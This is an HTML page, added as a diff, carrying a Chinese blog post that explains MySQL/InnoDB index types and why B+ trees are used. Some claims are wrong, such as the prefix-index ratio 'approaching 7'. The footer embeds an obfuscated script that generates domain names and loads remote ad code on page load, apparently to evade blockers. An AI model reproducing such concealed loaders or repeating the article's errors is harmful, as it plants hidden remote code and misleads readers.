@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>mysql中的各种索引大总结 - 编程爱好者博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="mysql中的各种索引大总结" />
+<meta property="og:description" content="文章目录 为啥不用二叉搜索树？为啥不用平衡二叉（avl）树？为啥不用b-树？为啥用b&#43;树？（重点）索引聚簇索引聚簇索引的局限聚集的数据的优点非聚簇索引介绍组合索引覆盖索引前缀索引前缀索引选择算法全文索引hash索引b-tree索引自适应哈希索引小咸鱼的技术窝 b-tree索引使用的是b&#43;树的数据结构，树有这么多种，那为啥就选择b&#43;树呢？那就从为啥使用b&#43;树开始，到分析其原理的思路一步步分析吧。以下内容针对innodb来说 为啥不用二叉搜索树？ 二叉搜索树定义：
+非空左子树的所有键值小于其根结点的键值。非空右子树的所有键值大于其根结点的键值。左、右子树都是二叉搜索树。就是左节点&lt;根节点&lt;右节点。 看下图树太高了。查询效率太低，故不推荐。 为啥不用平衡二叉（avl）树？ 平衡二叉（avl）树定义：
+非叶子节点最多拥有两个子节点。非叶子节值大于左边子节点、小于右边子节点。树的左右两边的层级数相差不会大于1。没有值相等重复的节点。 虽然avl树对于二叉树来说是平衡了降低了树的高度，虽然提高了性能，但是数据量大一点的时候，高度依旧很高。毕竟定义一摆在那，非叶子节点怎么找最多也只能有俩个子节点，故不推荐。
+为啥不用b-树？ b-树定义：
+在一个节点中，存放着数据（包括key和data）以及指针，且相互间隔。
+同一个节点，key增序。
+一个节点最左边的指针不为空，则它指定的节点左右的key小于最左边的key。右边同理。中间的指针指向的节点的key位于相邻两个key的中间。
+B-Tree中不同节点存放的key和指针可能数量不一致，但是每个节点的域和上限是一致的，所以在实现中B-Tree往往对每个节点申请同等大小的空间。
+每个非叶子节点由n-1个key和n个指针组成，其中d&lt;=n&lt;=2d。
+简单点来说呢，b-树又称多路查找树相对于avl树来说就是每个节点下面可以有多个分叉。至少多于2个叉撒，对于百万级别的数据又是降低了树的高度，虽然提高了性能，但是由于每个索引节点都有存放
+data域的指针，而我们计算机每次从磁盘读取数据时以页（4kb）为单位，每次读取4096byte的数据，导致读取单个节点时，可能由于节点过大，每次读出的数据有限，从而增大io次数，故在mysql这种关系型数据库中不推荐。但是b-树还是有它自己的优点的，如果查找的节点，离根节点很近那么查找的效率还是很高的
+为啥用b&#43;树？（重点） b&#43;树定义：
+内节点不存储data，只存储key和指针；叶子节点不存储指针，存key和data。内节点和叶子节点大小不同。每个节点的指针上限为2d而不是2d&#43;1 b&#43;树相对与b-树来说好的地方就是：
+数据只在叶子节点上面才有。解决了b-树非叶子节点过大导致io次数过多的问题。树高更低同时由于非叶子节点不放数据，单个节点能存的关键字更多了，极大的降低了树的层级高度。可以范围查找由于叶子节点之间是有一个有序链表来维护的，进行范围查找十分方便，单向的还是双向的不清楚，先搁着下面测试在来看。全节点遍历更快b&#43;树只需扫描叶子节点，而不是像b-树那样逐层扫描每个节点查询速度更稳定如果是b-树，查离根节点近的速度就快，远的就慢，而b&#43;树数据全在叶子节点，每次查找的速度都相同
+到此为啥使用b&#43;树就有底了。那么开始正文。。。。。 索引 索引定义：一种数据结构
+按照范围从大到小来说吧，最大的是聚簇索引、非聚簇索引。接着是我们常说的b-tree索引、hash索引，而我们的覆盖索引、前缀索引、组合索引、复合索引、全文索引是基于b-tree、hash索引来说的，还有的就是Innodb引擎独有的自适应哈希索引下面一一展开了来说。
+聚簇索引 聚簇索引定义：是一种存储数据的方式，数据与索引在一个文件中。它的辅助索引的叶子节点存储的是指向行的指针。
+一般来说innodb是按照主键来进行聚集的，这就意味着被索引的列就是主键列。如果主键不存在，其次就是按照非空唯一性约束来进行聚集，如果这个约束都没得，其次就是按照Innodb它自己生成的一个隐藏主键列来聚集。那么使用聚簇索引有什么优缺点吗？当然是有的。
+聚簇索引的局限 如果我们往聚簇索引中插入非顺序的数据时的情况下面
+由于新行的主键不一定比前一个大，Innodb不能总是把数据插入到最后一行，因此需要为新行进行寻找位置，从而进行多次随机的io更新数据时innodb有时不得不进行分页，为新行开辟内存空间，这会导致移动大量的数据页面会因为分页变得稀疏不规则从而就会导致一些不规则的碎片产生在没有覆盖索引的情况下，查辅助索引的时候，经常需要回表
+而且如果我们按照主键顺序插入行的情况下，使用uuid來聚集也是不好的。也会产生写，到磁盘上的数据被重新读取出来，并且由于位置的不确定，也会导致大量的数据移动 聚集的数据的优点 聚集索引把数据和索引全部放到一个b-tree下面，从聚集索引中取得数据通常比非聚集索引取得的数据更快，因为不需要二次查找。对于范围查询的效率很高，因为数据是有序的 非聚簇索引介绍 非聚簇索引是什么呢？其实我们所说的辅助索引、第二索引啊啥的其实可以理解为就是非聚簇索引。非聚簇索引就是叶子节点的data域中存的不是完整的数据，而是指向磁盘数据的指针。
+组合索引 定义：单列索引的组合。我感觉和覆盖索引没啥差别，假设现在有一张表（test）有a,b,c,d,e这么几个字段，其中我们为a，b，c列添加一个索引叫a_b_c，这个就是组合索引。
+覆盖索引 定义：索引列已经包含了我们需要查询的数据。其实就是组合索引（复合索引）在特定情况下的又一别称。假设现在有一张表（test）有a,b,c,d,e这么几个字段，其中我们为a，b，c列添加一个索引叫a_b_c，现在select a,b,c from test where a = x1 and b = x2 and c = x3;我们需要查询的数据在辅助索引上面已经有了，此时使用的就是复合索引。
+前缀索引 定义：为数据的前面几个字段创建的索引。我个人理解其实就是单列索引的变种。那为什么要为前几个字符创建索引而不是为其全部来创建索引呢？原因也是很简单，这个得结合应用场景来说了。现在有这么一张表，专门是存储家庭地址的，一个地址动不动就是十来个字的长度，如果我们以全部长度来创建索引，那么这个索引文件是超级的大啊。此时创建前缀索引是个不错的选择，可以大幅度压缩索引的大小，那么我们该如何确定前缀索引的长度的呢？这就是涉及到一个算法了。
+前缀索引选择算法 不重复的索引值/所有行 = 比值，这个比值接近7的时候，所得到的结果就会越加精确。
+全文索引 参考
+https://blog.csdn.net/Samdy_Chan/article/details/78138420?utm_medium=distribute.pc_relevant.none-task-blog-blogcommendfrommachinelearnpai2-1.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-blogcommendfrommachinelearnpai2-1.edu_weight
+hash索引 使用的场景：一些读操作密集的表建议使用hash索引，因为hash索引的查找速度是很快的。但是也有一些局限。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchobby.github.io/posts/b8d79473148cb7dc3ef83fd3addcb21e/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-24T15:12:20+08:00" />
+<meta property="article:modified_time" content="2023-11-24T15:12:20+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程爱好者博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">mysql中的各种索引大总结</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-tomorrow-night-eighties">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p></p> 
+<div class="toc"> 
+ <h4>文章目录</h4> 
+ <ul><li><ul><li><a href="#_4" rel="nofollow">为啥不用二叉搜索树？</a></li><li><a href="#avl_13" rel="nofollow">为啥不用平衡二叉（avl）树？</a></li><li><a href="#b_23" rel="nofollow">为啥不用b-树？</a></li><li><a href="#b_37" rel="nofollow">为啥用b+树？（重点）</a></li><li><a href="#_51" rel="nofollow">索引</a></li><li><a href="#_56" rel="nofollow">聚簇索引</a></li><li><a href="#_61" rel="nofollow">聚簇索引的局限</a></li><li><a href="#_69" rel="nofollow">聚集的数据的优点</a></li><li><a href="#_73" rel="nofollow">非聚簇索引介绍</a></li><li><a href="#_77" rel="nofollow">组合索引</a></li><li><a href="#_80" rel="nofollow">覆盖索引</a></li><li><a href="#_83" rel="nofollow">前缀索引</a></li><li><a href="#_87" rel="nofollow">前缀索引选择算法</a></li><li><a href="#_91" rel="nofollow">全文索引</a></li><li><a href="#hash_98" rel="nofollow">hash索引</a></li><li><a href="#btree_106" rel="nofollow">b-tree索引</a></li><li><a href="#_109" rel="nofollow">自适应哈希索引</a></li><li><a href="#_111" rel="nofollow">小咸鱼的技术窝</a></li></ul> 
+ </li></ul> 
+</div> 
+<br> b-tree索引使用的是b+树的数据结构，树有这么多种，那为啥就选择b+树呢？那就从为啥使用b+树开始，到分析其原理的思路一步步分析吧。以下内容针对innodb来说 
+<p></p> 
+<h3><a id="_4"></a>为啥不用二叉搜索树？</h3> 
+<p>二叉搜索树定义：</p> 
+<ol><li>非空左子树的所有键值小于其根结点的键值。</li><li>非空右子树的所有键值大于其根结点的键值。</li><li>左、右子树都是二叉搜索树。就是左节点&lt;根节点&lt;右节点。 看下图树太高了。查询效率太低，故不推荐。</li></ol> 
+<p><img src="https://images2.imgbox.com/f7/c7/MgcUTHvy_o.png" alt="在这里插入图片描述"></p> 
+<h3><a id="avl_13"></a>为啥不用平衡二叉（avl）树？</h3> 
+<p>平衡二叉（avl）树定义：</p> 
+<ol><li>非叶子节点最多拥有两个子节点。</li><li>非叶子节值大于左边子节点、小于右边子节点。</li><li>树的左右两边的层级数相差不会大于1。</li><li>没有值相等重复的节点。</li></ol> 
+<blockquote> 
+ <p>虽然avl树对于二叉树来说是平衡了降低了树的高度，虽然提高了性能，但是数据量大一点的时候，高度依旧很高。毕竟定义一摆在那，非叶子节点怎么找最多也只能有俩个子节点，故不推荐。</p> 
+</blockquote> 
+<h3><a id="b_23"></a>为啥不用b-树？</h3> 
+<p>b-树定义：</p> 
+<ol><li> <p>在一个节点中，存放着数据（包括key和data）以及指针，且相互间隔。</p> </li><li> <p>同一个节点，key增序。</p> </li><li> <p>一个节点最左边的指针不为空，则它指定的节点左右的key小于最左边的key。右边同理。中间的指针指向的节点的key位于相邻两个key的中间。</p> </li><li> <p>B-Tree中不同节点存放的key和指针可能数量不一致，但是每个节点的域和上限是一致的，所以在实现中B-Tree往往对每个节点申请同等大小的空间。</p> </li><li> <p>每个非叶子节点由n-1个key和n个指针组成，其中d&lt;=n&lt;=2d。</p> </li></ol> 
+<blockquote> 
+ <p>简单点来说呢，b-树又称多路查找树相对于avl树来说就是每个节点下面可以有多个分叉。至少多于2个叉撒，对于百万级别的数据又是降低了树的高度，虽然提高了性能，但是由于每个索引节点都有存放<br> data域的指针，而我们计算机每次从磁盘读取数据时以页（4kb）为单位，每次读取4096byte的数据，导致读取单个节点时，可能由于节点过大，每次读出的数据有限，从而增大io次数，故在mysql这种关系型数据库中不推荐。但是b-树还是有它自己的优点的，如果查找的节点，离根节点很近那么查找的效率还是很高的</p> 
+</blockquote> 
+<h3><a id="b_37"></a>为啥用b+树？（重点）</h3> 
+<p>b+树定义：</p> 
+<ol><li>内节点不存储data，只存储key和指针；叶子节点不存储指针，存key和data。</li><li>内节点和叶子节点大小不同。</li><li>每个节点的指针上限为2d而不是2d+1</li></ol> 
+<p>b+树相对与b-树来说好的地方就是：</p> 
+<ol><li><strong>数据只在叶子节点上面才有</strong>。解决了b-树非叶子节点过大导致io次数过多的问题。</li><li><strong>树高更低</strong>同时由于非叶子节点不放数据，单个节点能存的关键字更多了，极大的降低了树的层级高度。</li><li><strong>可以范围查找</strong>由于叶子节点之间是有一个有序链表来维护的，进行范围查找十分方便，单向的还是双向的不清楚，先搁着下面测试在来看。</li><li><strong>全节点遍历更快</strong>b+树只需扫描叶子节点，而不是像b-树那样逐层扫描每个节点</li><li><strong>查询速度更稳定</strong>如果是b-树，查离根节点近的速度就快，远的就慢，而b+树数据全在叶子节点，每次查找的速度都相同<br> 到此为啥使用b+树就有底了。那么开始正文。。。。。</li></ol> 
+<h3><a id="_51"></a>索引</h3> 
+<p>索引定义：一种数据结构</p> 
+<blockquote> 
+ <p>按照范围从大到小来说吧，最大的是<strong>聚簇索引、非聚簇索引</strong>。接着是我们常说的<strong>b-tree索引、hash索引</strong>，而我们的<strong>覆盖索引、前缀索引、组合索引、复合索引、全文索引</strong>是基于b-tree、hash索引来说的，还有的就是Innodb引擎独有的<strong>自适应哈希索引</strong>下面一一展开了来说。</p> 
+</blockquote> 
+<h3><a id="_56"></a>聚簇索引</h3> 
+<p><strong>聚簇索引定义：是一种存储数据的方式，数据与索引在一个文件中。它的辅助索引的叶子节点存储的是指向行的指针。</strong></p> 
+<blockquote> 
+ <p>一般来说innodb是按照主键来进行聚集的，这就意味着被索引的列就是主键列。如果主键不存在，其次就是按照非空唯一性约束来进行聚集，如果这个约束都没得，其次就是按照Innodb它自己生成的一个隐藏主键列来聚集。那么使用聚簇索引有什么优缺点吗？当然是有的。</p> 
+</blockquote> 
+<h3><a id="_61"></a>聚簇索引的局限</h3> 
+<p>如果我们往聚簇索引中插入非顺序的数据时的情况下面</p> 
+<ol><li>由于新行的主键不一定比前一个大，Innodb不能总是把数据插入到最后一行，因此需要为新行进行寻找位置，从而进行多次随机的io</li><li>更新数据时innodb有时不得不进行分页，为新行开辟内存空间，这会导致移动大量的数据</li><li>页面会因为分页变得稀疏不规则从而就会导致一些不规则的碎片产生</li><li>在没有覆盖索引的情况下，查辅助索引的时候，经常需要回表<br> 而且如果我们按照主键顺序插入行的情况下，使用uuid來聚集也是不好的。也会产生写，到磁盘上的数据被重新读取出来，并且由于位置的不确定，也会导致大量的数据移动</li></ol> 
+<h3><a id="_69"></a>聚集的数据的优点</h3> 
+<ol><li>聚集索引把数据和索引全部放到一个b-tree下面，从聚集索引中取得数据通常比非聚集索引取得的数据更快，因为不需要二次查找。</li><li>对于范围查询的效率很高，因为数据是有序的</li></ol> 
+<h3><a id="_73"></a>非聚簇索引介绍</h3> 
+<p><strong>非聚簇索引是什么呢？其实我们所说的辅助索引、第二索引啊啥的其实可以理解为就是非聚簇索引</strong>。非聚簇索引就是叶子节点的data域中存的不是完整的数据，而是指向磁盘数据的指针。</p> 
+<h3><a id="_77"></a>组合索引</h3> 
+<p>定义：单列索引的组合。我感觉和覆盖索引没啥差别，假设现在有一张表（test）有a,b,c,d,e这么几个字段，其中我们为a，b，c列添加一个索引叫a_b_c，这个就是组合索引。</p> 
+<h3><a id="_80"></a>覆盖索引</h3> 
+<p>定义：索引列已经包含了我们需要查询的数据。其实就是组合索引（复合索引）在特定情况下的又一别称。假设现在有一张表（test）有a,b,c,d,e这么几个字段，其中我们为a，b，c列添加一个索引叫a_b_c，现在select a,b,c from test where a = x1 and b = x2 and c = x3;我们需要查询的数据在辅助索引上面已经有了，此时使用的就是复合索引。</p> 
+<h3><a id="_83"></a>前缀索引</h3> 
+<p>定义：为数据的前面几个字段创建的索引。我个人理解其实就是单列索引的变种。那为什么要为前几个字符创建索引而不是为其全部来创建索引呢？原因也是很简单，这个得结合应用场景来说了。现在有这么一张表，专门是存储家庭地址的，一个地址动不动就是十来个字的长度，如果我们以全部长度来创建索引，那么这个索引文件是超级的大啊。此时创建前缀索引是个不错的选择，<strong>可以大幅度压缩索引的大小</strong>，那么我们该如何确定前缀索引的长度的呢？这就是涉及到一个算法了。</p> 
+<h3><a id="_87"></a>前缀索引选择算法</h3> 
+<p><strong>不重复的索引值/所有行 = 比值</strong>，这个比值接近7的时候，所得到的结果就会越加精确。</p> 
+<h3><a id="_91"></a>全文索引</h3> 
+<p>参考<br> <a href="https://blog.csdn.net/Samdy_Chan/article/details/78138420?utm_medium=distribute.pc_relevant.none-task-blog-blogcommendfrommachinelearnpai2-1.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-blogcommendfrommachinelearnpai2-1.edu_weight">https://blog.csdn.net/Samdy_Chan/article/details/78138420?utm_medium=distribute.pc_relevant.none-task-blog-blogcommendfrommachinelearnpai2-1.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-blogcommendfrommachinelearnpai2-1.edu_weight</a></p> 
+<h3><a id="hash_98"></a>hash索引</h3> 
+<p>使用的场景：一些读操作密集的表建议使用hash索引，因为hash索引的查找速度是很快的。但是也有一些局限。<br> hash索引的局限性：</p> 
+<ol><li>hash索引只包含哈希码和行指针，不能使用索引的值避免读取行，也就是要回表，不能像覆盖索引那样避免回表。</li><li>hash索引不能进行排序以及范围查找，因为它们不会按照顺序保存行。</li><li>有可能产生hash碰撞，那么就必须要访问链表的每一个行指针，然后逐行进行比较得出正确数据。</li><li>只支持 = 、in 、&lt;=&gt;的比较，为啥呢原因很简单，不会按照顺序存行。</li><li>不支持部分键匹配，例如有个组合索引a_b，那么此时即使我们的where子句中使用到了a，也不会使用索引。</li></ol> 
+<h3><a id="btree_106"></a>b-tree索引</h3> 
+<p>底层数据结构b+tree，对比hash的局限来看，hash索引的局限在b-tree索引这都不是事，除了hash索引查询速度快这点上面</p> 
+<h3><a id="_109"></a>自适应哈希索引</h3> 
+<p>与其说这是一种索引不如称其为是一种机制。自适应哈希索引的由来就是：当Innodb注意到一些索引值被频繁的访问时，内部会在b-tree索引的顶端为其创建索引保存在内存之中，使其具有快速哈希查找的特性，这个过程是它自动完成的</p> 
+<h3><a id="_111"></a>小咸鱼的技术窝</h3> 
+<p>关注不迷路，日后分享更多技术干货，B站、CSDN、微信公众号同名，名称都是（小咸鱼的技术窝）更多详情在主页<br> <img src="https://images2.imgbox.com/b7/5f/KJYe87KP_o.jpg" alt="在这里插入图片描述"></p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/fda421d5dedc59fc92051ecedceea31c/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">一文搞懂分库分表算法，通俗易懂（基因法、一致性 hash、时间维度）</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/37d689a6dc9c139695d0fe1c2bd80bcb/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Laya中的脚本与外部的Js之间相互调用</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程爱好者博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
